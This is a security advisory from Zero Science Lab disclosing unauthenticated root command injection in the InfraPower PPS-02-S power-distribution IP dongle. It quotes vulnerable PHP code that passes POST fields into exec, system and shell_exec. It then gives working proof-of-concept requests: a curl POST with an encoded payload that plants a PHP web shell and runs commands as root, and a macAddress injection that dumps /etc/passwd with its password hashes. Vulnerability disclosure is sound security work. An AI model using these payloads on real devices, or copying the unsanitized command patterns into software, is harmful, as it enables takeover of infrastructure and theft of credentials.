@@ -1,0 +1,348 @@
+InfraPower PPS-02-S Q213V1 Unauthenticated Remote Root Command Execution
+
+
+Vendor: Austin Hughes Electronics Ltd.
+Product web page: http://www.austin-hughes.com
+Affected version: Q213V1 (Firmware: V2395S)
+Fixed version: Q216V3 (Firmware: IPD-02-FW-v03)
+
+Summary: InfraPower Manager PPS-02-S is a FREE built-in GUI of each
+IP dongle ( IPD-02-S only ) to remotely monitor the connected PDUs.
+Patented IP Dongle provides IP remote access to the PDUs by a true
+network IP address chain. Only 1xIP dongle allows access to max. 16
+PDUs in daisy chain - which is a highly efficient cient application
+for saving not only the IP remote accessories cost, but also the true
+IP addresses required on the PDU management.
+
+Desc: InfraPower suffers from multiple unauthenticated remote command
+injection vulnerabilities. The vulnerability exist due to several POST
+parameters in several scripts not being sanitized when using the exec(),
+proc_open(), popen() and shell_exec() PHP function while updating the
+settings on the affected device. This allows the attacker to execute
+arbitrary system commands as the root user and bypass access controls in
+place.
+
+Tested on: Linux 2.6.28 (armv5tel)
+           lighttpd/1.4.30-devel-1321
+           PHP/5.3.9
+           SQLite/3.7.10
+
+
+Vulnerabiliy discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5372
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5372.php
+
+
+27.09.2016
+
+--
+
+
+doupgrate.php:
+--------------
+
+
+09: <?
+10: echo "Firmware Upgrate Using NFS:<BR>";
+11: echo "IP=".$_POST["ipaddr"]."<BR>";
+12: echo "Firmware Name=".$_POST["fwname"]."<BR>";
+13: system("sh nfs.sh");
+14: echo "Mounting NFS<BR>";
+15: system("mount -t nfs -o nolock ".$_POST["ipaddr"].":".$_POST["nfsdir"]." /nfs");
+16: system("cp /nfs/".$_POST["fwname"]." /");
+17: echo "Flash erasing<BR>";
+18: system("@flash_eraseall /dev/mtd0");
+19: system("cp /".$_POST["fwname"]." /dev/mtd0");
+20: echo "Upgrate done<BR>";
+21: system("umount /nfs");
+22: echo "Reboot system<BR>";
+23: system("reboot");
+24: ?>
+
+---------------------------------------------------------------------
+
+
+IPSettings.php:
+---------------
+
+
+83: $IP_setting = ereg_ip($_POST['IP']);
+84: $Netmask_setting = ereg_ip($_POST['Netmask']);
+85: $Gateway_setting = ereg_ip($_POST['Gateway']);
+...
+...
+110:                    $fout = fopen("/mnt/mtd/net_conf", "w");
+111:                    if($fout){
+112:                        $output = substr($output, 0, -1);
+113:                        fprintf($fout, "%s", $output);
+114:                        //echo $change_ip.'b';
+115:                        if($change_ip === '1'){
+116:                            $str = '';
+117:                            exec('ifconfig eth0 '.$IP_setting.' netmask '.$Netmask_setting, $str);
+118: //                          echo $str."\n";
+119:                        }
+120:                        if($change_gw === '1'){
+121:                            $str = '';
+122:                            exec('ip route del default', $str);
+123:                            exec('route add default gw '.$Gateway_setting, $str);
+124: //                          echo $str[0]."a\n";
+125:                        }
+126:                    }
+127:                    fclose($fout);
+...
+...
+164:    function ereg_ip($ipstring){ 
+165:         $ipstring=trim($ipstring); //移除前後空白 
+166:        //格式錯誤 
+167:        if(!ereg("^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$",$ipstring))return 0; 
+168:        //內容檢查 
+169:        $ip_segment =split("\.",$ipstring); //注意一定要加 "\"，否則會分不開。 
+170:        foreach($ip_segment as $k =>$v){ 
+171:            if($v >255){ 
+171:                return 0; 
+172:            }
+173:            $ip_segment[$k]=(int)$ip_segment[$k]; //消除ip中的0，ex:1.020.003.004 =>1.20.3.4 
+174:        } //end foreach 
+175:        $ipstring ="$ip_segment[0].$ip_segment[1].$ip_segment[2].$ip_segment[3]"; //將字串$ip處理 
+176:        return $ipstring; 
+177:    }
+
+---------------------------------------------------------------------
+
+
+Login.php:
+----------
+
+
+126:         $UserName = getConf("/mnt/mtd/web_conf", "UserName");
+127:         $Password = getConf("/mnt/mtd/web_conf", "Password");
+128:
+129:         //echo 'z'.$_POST['ID_User'].';'.$UserName.' Pwd:'.$_POST['ID_Password'].';'.$Password;
+130:         if($_POST['ID_User'] === $UserName && $_POST['ID_Password'] === $Password){
+...
+...
+140:             $_SESSION['Login'] = $_POST['ID_User'];
+141: 
+142:             //Login
+143:             $loginTime = date("Y-m-d,H:i:s.0,P");
+144:             $remoteIP = $_SERVER['REMOTE_ADDR'];
+145: //----------SNMP checking ---Ed 20130307------------------------<
+146:             $SNMPEnable = getConf("/mnt/mtd/snmp_conf", "enable");
+147:             if ($SNMPEnable == "1") {
+148:                 $TrapEnable = getConf("/mnt/mtd/snmp_conf", "trap");
+149:                 if ($TrapEnable == "v2Trap") {
+150:                     $trapTo = getConf("/mnt/mtd/snmp_conf", "IP");
+151:                     shell_exec('/usr/bin/snmptrap -M /usr/share/snmp/mibs/ -c public -v 2c ' . $trapTo . ' \'\' InfraPower-MIB::webLogin InfraPower-MIB::objectDateTime s "' . $loginTime . '"  InfraPower-MIB::userName s "' . $_POST['ID_User'] . '" InfraPower-MIB::webAccessIpAddress s "' . $remoteIP . '"');
+152:                     //echo "alert($res);";
+153:                 }
+154:             }
+
+---------------------------------------------------------------------
+
+
+Ntp.php:
+--------
+
+
+36: <?php
+37: if(empty($_POST['Change']))
+38:   $tzone='8';
+39: else
+40: {
+41:
+42: $tzone=$_POST['ID_timezone'];
+43: $idx=$tzone+12;
+44: echo "update status...";
+45: exec("/usr/bin/ntpclient  -s -h 220.130.158.71");
+46: exec("/usr/bin/zonegen ".$idx);
+47: exec("/usr/bin/zic -d /usr/bin/ zonetime");
+48: exec("mv /usr/bin/localtime /etc/localtime");
+49: echo "OK"; 
+50: }
+51: ?>
+
+---------------------------------------------------------------------
+
+
+production_test1.php:
+---------------------
+
+
+4:  if( isset($_POST['macAddress']) )
+5:      {
+6:          shell_exec("echo ". $_POST['macAddress'] . " > /mnt/mtd/mac_addr");
+7:          $mac = shell_exec("cat /mnt/mtd/mac_addr");
+8:          /*$result = $fail;
+9:          echo $mac . ",";
+10:         echo $_POST['macAddress'];
+11:         if( !strcmp($mac,$_POST['macAddress']) )
+12:             $result = $success;
+13:         echo "verify - " . $mac . " - " . $result;*/
+14:         echo "verify - " . $mac;
+15:
+16:         exit();
+17:     }
+
+---------------------------------------------------------------------
+
+
+SNMP.php:
+---------
+
+
+34: if($_POST["SNMPAgent"] === "Enable"){
+35:     exec('kill -9 `ps | grep "snmpd -c /mnt/mtd/snmpd.conf" | cut -c 1-5`');
+36:     setConf("/mnt/mtd/snmp_conf", "enable", "1");
+37:
+38:     if(!empty($_POST["CommuintyString"]) && !empty($_POST["CommuintyWrite"]))
+39:         {
+40:               exec("cp /etc/snmpd.conf /mnt/mtd/snmpd.conf");
+41:               exec("sed -i s/public/".$_POST["CommuintyString"]."/g /mnt/mtd/snmpd.conf");
+42:               setConf("/mnt/mtd/snmp_conf", "pCommunity", $_POST["CommuintyString"]);
+43:               setSnmpConf(1,$_POST["CommuintyString"]);
+44:               setSnmpConf(2,$_POST["CommuintyWrite"]);
+45:               $pCommunity = $_POST["CommuintyString"];
+46:         }
+
+---------------------------------------------------------------------
+
+
+System.php:
+-----------
+
+
+86:    if(!empty($_POST['ChangeTime']) == "1"){
+87:        if(checkdate($_POST['month'], $_POST['day'], $_POST['year']) == 1){
+88:
+89:        //Ray modify
+90:        $datetime = date("mdHiY.s", mktime($_POST['hour']-1,$_POST['minute']-1,$_POST['second']-1,$_POST['month'],$_POST['day'],$_POST['year']));
+91:        //$datetime = $_POST['month'].$_POST['day'].$_POST['hour'].$_POST['minute'].$_POST['year'].'.'.$_POST['second'];
+92:        
+93:
+94:        if(isset($_POST['TimeZone'])){
+95:            setTimeZone($_POST['TimeZone']);
+96:            $orgZone = $_POST['TimeZone'];
+97:        }
+98:
+99:        exec('date '.$datetime);
+100:        exec('hwclock -w');
+101:        exec('hwclock -w -f /dev/rtc1');
+...
+...
+180:        if(isset($_POST['TimeServer'])){
+181:            //$TimeServer = ereg_ip($_POST['TimeServer']);          
+182:            if(!empty($_POST['TimeServer'])){
+183:            $TimeServer = $_POST['TimeServer'];             
+184:
+185:                $returnStr = exec("/usr/bin/ntpclient  -s -h ".$TimeServer . " -i 1");
+...
+...
+286: exec('ifconfig eth0 '.$IP_setting.' netmask '.$Netmask_setting, $str);
+...
+...
+292: exec('route add default gw '.$Gateway_setting, $str);
+...
+...
+336:    function ereg_ip($ipstring){
+337:         $ipstring=trim($ipstring); //移除前後空白
+338:        //格式錯誤
+339:        if(!ereg("^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$",$ipstring))return 0;
+340:        //內容檢查
+341:        $ip_segment =split("\.",$ipstring); //注意一定要加 "\"，否則會分不開。
+342:        foreach($ip_segment as $k =>$v){
+343:            if($v >255){
+344:                return 0;
+345:            }
+346:            $ip_segment[$k]=(int)$ip_segment[$k]; //消除ip中的0，ex:1.020.003.004 =>1.20.3.4
+347:        } //end foreach
+348:        $ipstring ="$ip_segment[0].$ip_segment[1].$ip_segment[2].$ip_segment[3]"; //將字串$ip處理
+349:        return $ipstring;
+350:    }
+
+---------------------------------------------------------------------
+
+
+UploadEXE.php:
+--------------
+
+
+72:  if(isset($_POST['hasFile'])){
+73:      if ($_FILES['ExeFile']['error'] > 0){
+74:          echo 'Error: ' . $_FILES['FW']['error'];
+75:      }else{
+76:          echo 'File Name: ' . $_FILES['ExeFile']['name'].'<br/>';
+...
+...
+80:          move_uploaded_file($_FILES['ExeFile']['tmp_name'], '/ramdisk/'.$_FILES['ExeFile']['name']);
+81:          chmod("/ramdisk/".$_FILES['ExeFile']['name'], "0777");
+82:          $fp = popen("\"/ramdisk/".$_FILES['ExeFile']['name']."\"", "r");
+
+---------------------------------------------------------------------
+---------------------------------------------------------------------
+---------------------------------------------------------------------
+
+
+#1
+--
+
+PoC Request:
+
+curl -i -s -k  -X 'POST' \
+    -H 'User-Agent: ZSL-Injectinator/3.1 (Unix)' -H 'Content-Type: application/x-www-form-urlencoded' \
+    --data-binary $'SNMPAgent=Enable&CommuintyString=public|%65%63%68%6f%20%22%3c%3f%70%68%70%20%65%63%68%6f%20%73%79%73%74%65%6d%28%5c%24%5f%47%45%54%5b%27%63%27%5d%29%3b%20%3f%3e%22%20%3Etest251.php%26&CommuintyWrite=private&TrapsVersion=v2Trap&IP=192.168.0.254' \
+    'https://192.168.0.17/SNMP.php?Menu=SMP'
+
+...
+
+curl -k https://192.168.0.17/test251.php?c=whoami;echo " at ";uname -a
+
+Response:
+
+root 
+ at
+Linux A320D 2.6.28 #866 PREEMPT Tue Apr 22 16:07:03 HKT 2014 armv5tel unknown
+
+
+#2
+--
+
+PoC Request:
+
+POST /production_test1.php HTTP/1.1
+Host: 192.168.0.17
+User-Agent: ZSL-Injectinator/3.1 (Unix)
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+macAddress=ZE:RO:SC:IE:NC:E0;cat /etc/passwd
+
+
+Response:
+
+HTTP/1.1 200 OK
+X-Powered-By: PHP/5.3.9
+Content-type: text/html
+Connection: close
+Date: Fri, 17 Jan 2003 16:58:52 GMT
+Server: lighttpd/1.4.30-devel-1321
+Content-Length: 751
+
+verify - root:4g.6AafvEPx9M:0:0:root:/:/sbin/root_shell.sh
+bin:x:1:1:bin:/bin:/bin/sh
+daemon:x:2:2:daemon:/usr/sbin:/bin/sh
+adm:x:3:4:adm:/adm:/bin/sh
+lp:x:4:7:lp:/var/spool/lpd:/bin/sh
+sync:x:5:0:sync:/bin:/bin/sync
+shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
+operator:x:11:0:Operator:/var:/bin/sh
+nobody:x:99:99:nobody:/home:/bin/sh
+admin:4g.6AafvEPx9M:1000:1000:Linux User,,,:/home:/bin/login_script
+user:4g.6AafvEPx9M:1001:1001:Linux User,,,:/home:/bin/login_Script
+service:AsZLenpCPzc0o:0:0:root:/www:/sbin/menu_shell.sh
+www:$1$tFXqWewd$3QCtiVztmLTe63e1WM3l6.:0:0:root:/www:/sbin/menu_shell.sh
+www2:$1$tFXqWewd$3QCtiVztmLTe63e1WM3l6.:0:0:root:/www2:/sbin/menu_shell.sh
